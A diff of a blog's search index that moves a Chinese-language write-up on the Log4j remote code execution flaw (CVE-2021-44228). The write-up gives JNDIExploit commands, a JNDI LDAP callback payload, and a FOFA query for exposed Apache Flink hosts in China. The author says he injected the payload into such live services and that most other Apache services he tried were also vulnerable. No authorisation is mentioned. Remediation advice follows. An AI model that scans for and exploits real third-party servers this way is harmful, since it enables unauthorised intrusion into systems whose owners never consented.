@@ -1,6 +1,38 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>【CNVD-2021-95914/CVE-2021-44228】Apache Log4j RCE漏洞</title>
+    <url>/2021/12/10/Apache%20Log4j%20RCE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>昨晚我正要去睡觉的时候，突然收到了好几个群消息，赶忙看了一下，发现是阿里云安全团队披露了一个Apache Log4j的0day，其实早在11月阿里云就已经向Apache官方提交了报告。</p>
+<p>Apache Log4j2是一款优秀的Java日志框架。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。</p>
+<p>因为Log4j这个框架利用的过于广泛，此漏洞一出，各大厂商纷纷中枪，一时间安全圈陷入了RCE的腥风血雨中，估计好多人都是一夜未眠~~</p>
+<a id="more"></a>
+
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Apache Log4j 2.x &lt;= 2.14.1<br>Apache Struts2<br>Apache Solr<br>Apache Druid<br>Apache Flink</p>
+<h3 id="漏洞等级"><a href="#漏洞等级" class="headerlink" title="漏洞等级"></a>漏洞等级</h3><p>漏洞等级：10 | 严重</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h4><p>先设置本地端口的监听</p>
+<pre class="line-numbers language-none"><code class="language-none">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i [ip]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/ApacheLog4jRCE/6.png" alt="图片"><br>用idea打开项目，替换自己的ip，build打包<br><img src="/images/ApacheLog4jRCE/7.png" alt="图片"><br>打包完会出现一个out文件夹，在这里输入如下指令，弹计算器</p>
+<pre class="line-numbers language-none"><code class="language-none">java -Dcom.sun.jndi.ldap.object.trustURLCodebase&#x3D;true -jar Log4j-rce.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/ApacheLog4jRCE/8.png" alt="图片"></p>
+<h4 id="实战复现"><a href="#实战复现" class="headerlink" title="实战复现"></a>实战复现</h4><p>因为大部分Apache的服务都存在这个漏洞，我就先找了一个Apache Flink平台<br>fofa语句：</p>
+<pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;APACHE-flink&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/ApacheLog4jRCE/1.png" alt="图片"><br>找一下输入框，然后放上payload，用自己的dnslog地址</p>
+<pre class="line-numbers language-none"><code class="language-none">$&#123;jndi:ldap:&#x2F;&#x2F;xxxxxx.dnslog.cn&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/ApacheLog4jRCE/2.png" alt="图片"><br>查看dnslog平台<br><img src="/images/ApacheLog4jRCE/3.png" alt="图片"><br>这个漏洞利用就是这么简单，后面我又测试了其他Apache服务，基本都成功了<br><img src="/images/ApacheLog4jRCE/4.png" alt="图片"><br><img src="/images/ApacheLog4jRCE/5.png" alt="图片"></p>
+<h4 id="骚操作"><a href="#骚操作" class="headerlink" title="骚操作"></a>骚操作</h4><p>这个漏洞爆出来后，我的朋友圈就被刷屏了，在里面我还看到了一些挺有趣的骚操作，可以学习一下思路<br><img src="/images/ApacheLog4jRCE/11.png" alt="图片"><br><img src="/images/ApacheLog4jRCE/10.png" alt="图片"><br><img src="/images/ApacheLog4jRCE/9.png" alt="图片"></p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1.升级Apache Log4j2所有相关应用到最新的 log4j-2.15.0-rc2 版本<br>地址：<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a><br>2.升级已知受影响的应用及组件，如srping-boot-strater-log4j2/Apache Solr/Apache Flink/Apache Druid</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://github.com/Yihsiwei/Log4j-exp">https://github.com/Yihsiwei/Log4j-exp</a><br><a href="https://github.com/feihong-cs/JNDIExploit">https://github.com/feihong-cs/JNDIExploit</a><br><a href="https://mp.weixin.qq.com/s/9f1cUsc1FPIhKkl1Xe1Qvw">https://mp.weixin.qq.com/s/9f1cUsc1FPIhKkl1Xe1Qvw</a></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>2021.12</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【1039家校通】SQL注入和后台GETSHELL</title>
     <url>/2021/01/25/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/</url>
     <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>1039家校通网上约车系统是一款驾校一体化系统。其目录中有多个上传点存在sql注入，还存在任意文件上传导致getshell。因为是比较老的漏洞，下面就直接展示挖掘过程了。</p>
@@ -32,38 +64,6 @@
       </categories>
       <tags>
         <tag>2014.7</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【CNVD-2021-95914/CVE-2021-44228】Apache Log4j RCE漏洞</title>
-    <url>/2021/12/10/Apache%20Log4j%20RCE%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>昨晚我正要去睡觉的时候，突然收到了好几个群消息，赶忙看了一下，发现是阿里云安全团队披露了一个Apache Log4j的0day，其实早在11月阿里云就已经向Apache官方提交了报告。</p>
-<p>Apache Log4j2是一款优秀的Java日志框架。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。</p>
-<p>因为Log4j这个框架利用的过于广泛，此漏洞一出，各大厂商纷纷中枪，一时间安全圈陷入了RCE的腥风血雨中，估计好多人都是一夜未眠~~</p>
-<a id="more"></a>
-
-<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Apache Log4j 2.x &lt;= 2.14.1<br>Apache Struts2<br>Apache Solr<br>Apache Druid<br>Apache Flink</p>
-<h3 id="漏洞等级"><a href="#漏洞等级" class="headerlink" title="漏洞等级"></a>漏洞等级</h3><p>漏洞等级：10 | 严重</p>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h4><p>先设置本地端口的监听</p>
-<pre class="line-numbers language-none"><code class="language-none">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i [ip]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/ApacheLog4jRCE/6.png" alt="图片"><br>用idea打开项目，替换自己的ip，build打包<br><img src="/images/ApacheLog4jRCE/7.png" alt="图片"><br>打包完会出现一个out文件夹，在这里输入如下指令，弹计算器</p>
-<pre class="line-numbers language-none"><code class="language-none">java -Dcom.sun.jndi.ldap.object.trustURLCodebase&#x3D;true -jar Log4j-rce.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/ApacheLog4jRCE/8.png" alt="图片"></p>
-<h4 id="实战复现"><a href="#实战复现" class="headerlink" title="实战复现"></a>实战复现</h4><p>因为大部分Apache的服务都存在这个漏洞，我就先找了一个Apache Flink平台<br>fofa语句：</p>
-<pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;APACHE-flink&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/ApacheLog4jRCE/1.png" alt="图片"><br>找一下输入框，然后放上payload，用自己的dnslog地址</p>
-<pre class="line-numbers language-none"><code class="language-none">$&#123;jndi:ldap:&#x2F;&#x2F;xxxxxx.dnslog.cn&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/ApacheLog4jRCE/2.png" alt="图片"><br>查看dnslog平台<br><img src="/images/ApacheLog4jRCE/3.png" alt="图片"><br>这个漏洞利用就是这么简单，后面我又测试了其他Apache服务，基本都成功了<br><img src="/images/ApacheLog4jRCE/4.png" alt="图片"><br><img src="/images/ApacheLog4jRCE/5.png" alt="图片"></p>
-<h4 id="骚操作"><a href="#骚操作" class="headerlink" title="骚操作"></a>骚操作</h4><p>这个漏洞爆出来后，我的朋友圈就被刷屏了，在里面我还看到了一些挺有趣的骚操作，可以学习一下思路<br><img src="/images/ApacheLog4jRCE/11.png" alt="图片"><br><img src="/images/ApacheLog4jRCE/10.png" alt="图片"><br><img src="/images/ApacheLog4jRCE/9.png" alt="图片"></p>
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1.升级Apache Log4j2所有相关应用到最新的 log4j-2.15.0-rc2 版本<br>地址：<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a><br>2.升级已知受影响的应用及组件，如srping-boot-strater-log4j2/Apache Solr/Apache Flink/Apache Druid</p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://github.com/Yihsiwei/Log4j-exp">https://github.com/Yihsiwei/Log4j-exp</a><br><a href="https://github.com/feihong-cs/JNDIExploit">https://github.com/feihong-cs/JNDIExploit</a><br><a href="https://mp.weixin.qq.com/s/9f1cUsc1FPIhKkl1Xe1Qvw">https://mp.weixin.qq.com/s/9f1cUsc1FPIhKkl1Xe1Qvw</a></p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>2021.12</tag>
       </tags>
   </entry>
   <entry>
